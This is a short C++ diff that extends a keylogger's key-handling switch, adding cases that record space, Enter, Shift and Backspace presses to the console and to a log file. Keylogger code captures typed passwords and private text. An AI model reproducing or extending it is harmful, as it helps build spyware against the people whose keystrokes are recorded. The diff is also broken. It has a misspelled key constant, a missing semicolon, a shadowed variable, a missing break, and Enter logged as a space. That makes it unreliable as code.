@@ -13,10 +13,25 @@ public:
 		logkey.close();
 	}
 bool CheckListKey(int key){
+	string key;
 switch(key){
 	case VK_SPACE:
-	cout << " ";//If space bar is pressed this will be logged as " "
+	cout << " ";//Space key log 
 	this->WriteToFile(" ")
+	break;
+	case VK RETURN:
+	cout << "\n";//Enter key log
+	this->WriteToFile(" ")
+	break;
+	case VK_SHIFT:
+	string shift = "<shiftkey>";
+	cout << shift;//Shift key log
+	this->WriteToFile(shift);
+	case VK_BACK:
+	cout << "\b";
+	WriteToFile("\b");
+	break;
+
 }
 }
 }
